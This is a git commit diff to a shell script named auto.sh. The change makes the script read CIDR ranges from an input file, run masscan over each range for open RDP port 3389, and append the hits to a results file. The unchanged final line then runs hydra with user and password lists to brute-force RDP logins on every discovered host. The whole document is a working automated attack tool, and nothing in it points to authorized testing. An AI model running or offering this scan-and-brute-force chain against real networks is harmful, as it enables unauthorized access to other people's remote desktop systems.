46bf19b6b7454a1954723334d42f2da4437d7b39
Ahmed Saeed <ahmedsaeedramadan@yahoo.com>
2020-11-06 08:29:55 +0200

    Update auto.sh

--- auto.sh
+++ auto.sh
@@ -1,4 +1,8 @@
-d=$(masscan -p3389 $1 )
+ranges=$(awk '{match($0, /[0-9]+\.[0-9]+\.[0-9]+\.*[0-9]+\/[0-9]+/); print substr($0, RSTART, RLENGTH)}' $1)
+for range in $ranges; do
+echo "scanning range "$range" for rdp"
+d=$(masscan -p3389 $range)
 ips=$(echo $d | sed 's/Discovered /\nDiscovered/g' | awk '{ print $5 }')
-echo $ips > results.txt
+echo $ips >> results.txt
+done
 for lin1 in $(cat results.txt); do hydra -L users.txt -P pass.txt -e ns -o Output/rdp_$lin1.txt -I -V -W 3 -t 10 $lin1 rdp ; done
